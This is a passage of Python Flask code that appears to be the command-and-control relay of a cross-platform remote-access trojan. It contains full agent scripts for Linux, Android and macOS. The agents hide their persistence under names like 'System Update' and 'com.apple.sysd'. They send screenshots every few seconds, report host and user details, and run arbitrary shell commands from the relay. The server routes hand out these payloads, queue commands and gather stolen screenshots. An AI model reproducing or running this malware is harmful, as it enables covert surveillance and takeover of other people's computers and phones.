        sd=os.path.expanduser('~/.config/systemd/user');os.makedirs(sd,exist_ok=True)
        open(os.path.join(sd,'sysupd.service'),'w').write(
            '[Unit]\nDescription=System Update\n[Service]\nExecStart=/usr/bin/env python3 '+AP+'\nRestart=always\nRestartSec=30\n[Install]\nWantedBy=default.target\n')
        subprocess.run(['systemctl','--user','enable','sysupd'],capture_output=True)
        subprocess.run(['systemctl','--user','start','sysupd'],capture_output=True)
    except:
        try:
            cr=subprocess.run(['crontab','-l'],capture_output=True,text=True);ex=cr.stdout if cr.returncode==0 else ''
            ent='@reboot /usr/bin/env python3 '+AP+' 2>/dev/null &\n'
            if ent not in ex:
                p=subprocess.Popen(['crontab','-'],stdin=subprocess.PIPE);p.communicate((ex+ent).encode())
        except:pass
def post(ep,d):
    try:
        b=json.dumps(d).encode();req=urllib.request.Request(R+ep,b,{'Content-Type':'application/json'})
        urllib.request.urlopen(req,timeout=15)
    except:pass
def get_(ep):
    try:return json.loads(urllib.request.urlopen(R+ep,timeout=8).read())
    except:return {}
def shot():
    try:
        f=tempfile.mktemp(suffix='.jpg');env=os.environ.copy();env.setdefault('DISPLAY',':0')
        for c in [['scrot','-q','25',f],['import','-window','root','-quality','25',f],['gnome-screenshot','-f',f]]:
            if subprocess.run(c,capture_output=True,env=env).returncode==0:break
        if os.path.isfile(f) and os.path.getsize(f)>100:
            d=open(f,'rb').read();os.unlink(f);return base64.b64encode(d).decode()
    except:pass
    return ''
try:ip=socket.gethostbyname(socket.gethostname())
except:ip='?'
OS=platform.system()+' '+platform.release()
post('/esp/device-register',{'did':DID,'hostname':socket.gethostname(),'os':OS,'user':os.environ.get('USER',os.environ.get('USERNAME','?')),'ip':ip,'arch':platform.machine(),'persistent':True})
lid=0;lst=0;lreg=time.time()
while True:
    try:
        if time.time()-lreg>30:
            post('/esp/device-register',{'did':DID,'hostname':socket.gethostname(),'os':OS,'user':os.environ.get('USER','?'),'ip':ip,'persistent':True});lreg=time.time()
        if time.time()-lst>3:
            img=shot()
            if img:post('/esp/device-screenshot',{'did':DID,'img':img,'os':OS})
            lst=time.time()
        p=get_('/esp/device-cmd?did='+DID)
        if p.get('cmd') and p.get('id',0)!=lid:
            lid=p['id'];cmd=p['cmd']
            if cmd=='__uninstall__':
                try:
                    subprocess.run(['systemctl','--user','stop','sysupd'],capture_output=True)
                    subprocess.run(['systemctl','--user','disable','sysupd'],capture_output=True)
                    os.remove(os.path.expanduser('~/.config/systemd/user/sysupd.service'))
                except:pass
                try:
                    cr=subprocess.run(['crontab','-l'],capture_output=True,text=True)
                    new='\n'.join(l for l in cr.stdout.splitlines() if AP not in l)
                    p2=subprocess.Popen(['crontab','-'],stdin=subprocess.PIPE);p2.communicate(new.encode())
                except:pass
                post('/esp/device-cmdout',{'did':DID,'cmd':cmd,'out':base64.b64encode(b'Uninstalled').decode()})
                time.sleep(1)
                try:os.remove(AP);os.remove(ID_F)
                except:pass
                sys.exit(0)
            try:
                r=subprocess.run(cmd,shell=True,capture_output=True,timeout=30)
                out=base64.b64encode(r.stdout+r.stderr).decode()
            except Exception as e:out=base64.b64encode(('Error: '+str(e)).encode()).decode()
            post('/esp/device-cmdout',{'did':DID,'cmd':cmd,'out':out,'os':OS})
    except KeyboardInterrupt:sys.exit(0)
    except:pass
    time.sleep(2)
"""

_PERSIST_ANDROID = r"""#!/usr/bin/env python3
import urllib.request,json,subprocess,base64,socket,os,time,sys,uuid,shutil
R='__RELAY__'
HOME=os.path.expanduser('~')
ID_F=os.path.join(HOME,'.xaid');AP=os.path.join(HOME,'sysupd.py')
DID=open(ID_F).read().strip() if os.path.exists(ID_F) else str(uuid.uuid4())
if not os.path.exists(ID_F):open(ID_F,'w').write(DID)
if os.path.realpath(sys.argv[0])!=AP:
    try:shutil.copy2(sys.argv[0],AP);os.chmod(AP,0o700)
    except:
        try:urllib.request.urlretrieve(R+'/sh/persist-android',AP);os.chmod(AP,0o700)
        except:pass
    try:
        bd=os.path.expanduser('~/.termux/boot');os.makedirs(bd,exist_ok=True)
        bs=os.path.join(bd,'agent.sh')
        open(bs,'w').write('#!/data/data/com.termux/files/usr/bin/bash\npython3 '+AP+' 2>/dev/null &\n')
        os.chmod(bs,0o700)
    except:pass
    try:
        rc=os.path.expanduser('~/.bashrc');ex=open(rc).read() if os.path.exists(rc) else ''
        e='python3 '+AP+' 2>/dev/null &\n'
        if e not in ex:open(rc,'a').write(e)
    except:pass
def post(ep,d):
    try:
        b=json.dumps(d).encode();req=urllib.request.Request(R+ep,b,{'Content-Type':'application/json'})
        urllib.request.urlopen(req,timeout=15)
    except:pass
def get_(ep):
    try:return json.loads(urllib.request.urlopen(R+ep,timeout=8).read())
    except:return {}
def shot():
    try:
        td=os.environ.get('TMPDIR','/data/data/com.termux/files/usr/tmp')
        f=os.path.join(td,'ss.png')
        r=subprocess.run(['screencap','-p',f],capture_output=True,timeout=5)
        if r.returncode!=0 or not os.path.isfile(f) or os.path.getsize(f)<100:
            subprocess.run(['termux-screenshot','-q',f],capture_output=True,timeout=10)
        if os.path.isfile(f) and os.path.getsize(f)>100:
            d=open(f,'rb').read();os.unlink(f);return base64.b64encode(d).decode()
    except:pass
    return ''
try:ip=socket.gethostbyname(socket.gethostname())
except:ip='?'
OS='Android'
try:
    rv=subprocess.run(['getprop','ro.build.version.release'],capture_output=True,text=True,timeout=3)
    if rv.stdout.strip():OS='Android '+rv.stdout.strip()
except:pass
post('/esp/device-register',{'did':DID,'hostname':socket.gethostname(),'os':OS,'user':os.environ.get('USER','termux'),'ip':ip,'arch':os.uname().machine,'persistent':True})
lid=0;lst=0;lreg=time.time()
while True:
    try:
        if time.time()-lreg>30:
            post('/esp/device-register',{'did':DID,'hostname':socket.gethostname(),'os':OS,'user':'termux','ip':ip,'persistent':True});lreg=time.time()
        if time.time()-lst>3:
            img=shot()
            if img:post('/esp/device-screenshot',{'did':DID,'img':img,'os':OS})
            lst=time.time()
        p=get_('/esp/device-cmd?did='+DID)
        if p.get('cmd') and p.get('id',0)!=lid:
            lid=p['id'];cmd=p['cmd']
            if cmd=='__uninstall__':
                try:
                    bs=os.path.expanduser('~/.termux/boot/agent.sh')
                    if os.path.exists(bs):os.remove(bs)
                except:pass
                try:
                    rc=os.path.expanduser('~/.bashrc')
                    if os.path.exists(rc):
                        content=open(rc).read()
                        content=content.replace('python3 '+AP+' 2>/dev/null &\n','')
                        open(rc,'w').write(content)
                except:pass
                post('/esp/device-cmdout',{'did':DID,'cmd':cmd,'out':base64.b64encode(b'Uninstalled').decode()})
                time.sleep(1)
                try:os.remove(AP);os.remove(ID_F)
                except:pass
                sys.exit(0)
            try:
                r=subprocess.run(cmd,shell=True,capture_output=True,timeout=30)
                out=base64.b64encode(r.stdout+r.stderr).decode()
            except Exception as e:out=base64.b64encode(('Error: '+str(e)).encode()).decode()
            post('/esp/device-cmdout',{'did':DID,'cmd':cmd,'out':out,'os':OS})
    except KeyboardInterrupt:sys.exit(0)
    except:pass
    time.sleep(2)
"""

_PERSIST_MAC = r"""#!/usr/bin/env python3
import urllib.request,json,subprocess,base64,platform,socket,os,time,sys,uuid,tempfile,shutil
R='__RELAY__'
HOME=os.path.expanduser('~')
CFG=os.path.join(HOME,'.config','.sysd');os.makedirs(CFG,exist_ok=True)
ID_F=os.path.join(CFG,'.xaid');AP=os.path.join(CFG,'sysupd.py')
DID=open(ID_F).read().strip() if os.path.exists(ID_F) else str(uuid.uuid4())
if not os.path.exists(ID_F):open(ID_F,'w').write(DID)
if os.path.realpath(sys.argv[0])!=AP:
    try:shutil.copy2(sys.argv[0],AP);os.chmod(AP,0o700)
    except:
        try:urllib.request.urlretrieve(R+'/sh/persist-mac',AP);os.chmod(AP,0o700)
        except:pass
    try:
        la=os.path.expanduser('~/Library/LaunchAgents');os.makedirs(la,exist_ok=True)
        pf=os.path.join(la,'com.apple.sysd.plist')
        open(pf,'w').write('<?xml version="1.0" encoding="UTF-8"?>\n<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">\n<plist version="1.0"><dict>\n<key>Label</key><string>com.apple.sysd</string>\n<key>ProgramArguments</key><array><string>/usr/bin/python3</string><string>'+AP+'</string></array>\n<key>RunAtLoad</key><true/><key>KeepAlive</key><true/>\n</dict></plist>')
        subprocess.run(['launchctl','load',pf],capture_output=True)
    except:pass
def post(ep,d):
    try:
        b=json.dumps(d).encode();req=urllib.request.Request(R+ep,b,{'Content-Type':'application/json'})
        urllib.request.urlopen(req,timeout=15)
    except:pass
def get_(ep):
    try:return json.loads(urllib.request.urlopen(R+ep,timeout=8).read())
    except:return {}
def shot():
    try:
        f=tempfile.mktemp(suffix='.jpg')
        subprocess.run(['screencapture','-x','-t','jpg',f],capture_output=True)
        if os.path.isfile(f) and os.path.getsize(f)>100:
            d=open(f,'rb').read();os.unlink(f);return base64.b64encode(d).decode()
    except:pass
    return ''
try:ip=socket.gethostbyname(socket.gethostname())
except:ip='?'
OS='macOS '+platform.mac_ver()[0]
post('/esp/device-register',{'did':DID,'hostname':socket.gethostname(),'os':OS,'user':os.environ.get('USER','?'),'ip':ip,'arch':platform.machine(),'persistent':True})
lid=0;lst=0;lreg=time.time()
while True:
    try:
        if time.time()-lreg>30:
            post('/esp/device-register',{'did':DID,'hostname':socket.gethostname(),'os':OS,'user':os.environ.get('USER','?'),'ip':ip,'persistent':True});lreg=time.time()
        if time.time()-lst>3:
            img=shot()
            if img:post('/esp/device-screenshot',{'did':DID,'img':img,'os':OS})
            lst=time.time()
        p=get_('/esp/device-cmd?did='+DID)
        if p.get('cmd') and p.get('id',0)!=lid:
            lid=p['id'];cmd=p['cmd']
            if cmd=='__uninstall__':
                try:
                    pf=os.path.expanduser('~/Library/LaunchAgents/com.apple.sysd.plist')
                    subprocess.run(['launchctl','unload',pf],capture_output=True);os.remove(pf)
                except:pass
                post('/esp/device-cmdout',{'did':DID,'cmd':cmd,'out':base64.b64encode(b'Uninstalled').decode()})
                time.sleep(1)
                try:os.remove(AP);os.remove(ID_F)
                except:pass
                sys.exit(0)
            try:
                r=subprocess.run(cmd,shell=True,capture_output=True,timeout=30)
                out=base64.b64encode(r.stdout+r.stderr).decode()
            except Exception as e:out=base64.b64encode(('Error: '+str(e)).encode()).decode()
            post('/esp/device-cmdout',{'did':DID,'cmd':cmd,'out':out,'os':OS})
    except KeyboardInterrupt:sys.exit(0)
    except:pass
    time.sleep(2)
"""

# ── Persistent agent script routes ───────────────────────────────────────────

@app.route("/sh/persist-win")
def sh_persist_win():
    u = _base_url()
    return Response(_PERSIST_WIN.replace("__RELAY__", u), mimetype="text/plain; charset=utf-8")

@app.route("/sh/persist-linux")
def sh_persist_linux():
    u = _base_url()
    return Response(_PERSIST_LINUX.replace("__RELAY__", u), mimetype="text/plain; charset=utf-8")

@app.route("/sh/persist-mac")
def sh_persist_mac():
    u = _base_url()
    return Response(_PERSIST_MAC.replace("__RELAY__", u), mimetype="text/plain; charset=utf-8")

@app.route("/sh/persist-android")
def sh_persist_android():
    u = _base_url()
    return Response(_PERSIST_ANDROID.replace("__RELAY__", u), mimetype="text/plain; charset=utf-8")

# ── Multi-device persistent agent endpoints ──────────────────────────────────

@app.route("/esp/device-register", methods=["POST"])
def esp_device_register():
    data = request.get_json(silent=True) or {}
    did  = (data.get("did") or "").strip()
    if not did:
        return jsonify({"error": "missing did"}), 400
    with lock:
        d = _dev(did)
        d["hostname"]   = data.get("hostname") or d["hostname"]
        d["os"]         = data.get("os")       or d["os"]
        d["user"]       = data.get("user")     or d["user"]
        d["ip"]         = data.get("ip")       or d["ip"]
        d["arch"]       = data.get("arch")     or d["arch"]
        d["ts"]         = time.time()
        d["persistent"] = data.get("persistent", d["persistent"])
    return jsonify({"ok": True})

@app.route("/esp/device-cmd")
def esp_device_cmd():
    did = request.args.get("did", "").strip()
    with lock:
        if did not in _devices:
            return jsonify({"cmd": "", "id": 0})
        p = dict(_devices[did]["pending"])
    return jsonify(p)

@app.route("/esp/device-cmdout", methods=["POST"])
def esp_device_cmdout():
    data   = request.get_json(silent=True) or {}
    did    = (data.get("did") or "").strip()
    raw    = data.get("out", "")
    cmd    = data.get("cmd", "")
    tgt_os = data.get("os", "?")
    ts     = time.strftime("%H:%M:%S")
    try:
        out = base64.b64decode(raw).decode("utf-8", "replace")
    except Exception:
        out = raw
    with lock:
        if did and did in _devices:
            _devices[did]["history"].appendleft({"ts": ts, "cmd": cmd, "out": out, "os": tgt_os})
    return jsonify({"ok": True})

@app.route("/esp/device-screenshot", methods=["POST"])
def esp_device_screenshot():
    data = request.get_json(silent=True) or {}
    did  = (data.get("did") or "").strip()
    img  = data.get("img", "")
    if did and img:
        with lock:
            d = _dev(did)
            d["screenshot"]    = img
            d["screenshot_ts"] = time.time()
            d["ts"]            = time.time()
    return jsonify({"ok": bool(did and img)})

@app.route("/api/devices")
def api_devices():
    now = time.time()
    with lock:
        out = []
        for d in _devices.values():
            out.append({
                "id":            d["id"],
                "hostname":      d["hostname"],
                "os":            d["os"],
                "user":          d["user"],
                "ip":            d["ip"],
                "arch":          d["arch"],
                "online":        (now - d["ts"]) < 90,
                "ago":           round(now - d["ts"]),
                "persistent":    d["persistent"],
                "has_screenshot": d["screenshot"] is not None,
                "screenshot_ts": d["screenshot_ts"],
            })
    out.sort(key=lambda x: (-x["online"], x.get("hostname") or ""))
    return jsonify(out)

@app.route("/api/devices/<did>/screenshot")
def api_device_screenshot(did):
    with lock:
        if did not in _devices or not _devices[did]["screenshot"]:
            return jsonify({"error": "no screenshot"}), 404
        img_b64 = _devices[did]["screenshot"]
    try:
        img_bytes = base64.b64decode(img_b64)
    except Exception:
        return jsonify({"error": "bad image data"}), 500
    mime = "image/png" if img_bytes[:4] == b'\x89PNG' else "image/jpeg"
    resp = Response(img_bytes, mimetype=mime)
    resp.headers["Cache-Control"] = "no-store"
    return resp

@app.route("/api/devices/<did>/cmd", methods=["POST"])
def api_device_cmd_post(did):
    data = request.get_json(silent=True) or {}
    cmd  = data.get("cmd", "").strip()
    if not cmd:
        return jsonify({"error": "no command"}), 400
    with lock:
        if did not in _devices:
            return jsonify({"error": "device not found"}), 404
        d = _devices[did]
        d["pending"]["cmd"]  = cmd
        d["pending"]["id"]  += 1
        cmd_id = d["pending"]["id"]
    return jsonify({"ok": True, "id": cmd_id})

@app.route("/api/devices/<did>/history")
def api_device_history(did):
    with lock:
        if did not in _devices:
            return jsonify([])
        hist = list(_devices[did]["history"])[:50]
    return jsonify(hist)

@app.route("/api/devices/<did>", methods=["DELETE"])
def api_device_delete(did):
    with lock:
        if did not in _devices:
            return jsonify({"error": "not found"}), 404
        d = _devices[did]
        d["pending"]["cmd"]  = "__uninstall__"
        d["pending"]["id"]  += 1
    return jsonify({"ok": True, "queued": "uninstall"})

# ─────────────────────────────────────────────────────────────────────────────
if __name__ == "__main__":
    import sys
    port = int(sys.argv[1]) if len(sys.argv) > 1 else 8080
    print(f"[Relay] Starting on port {port}")
    app.run(host="0.0.0.0", port=port, threaded=True)
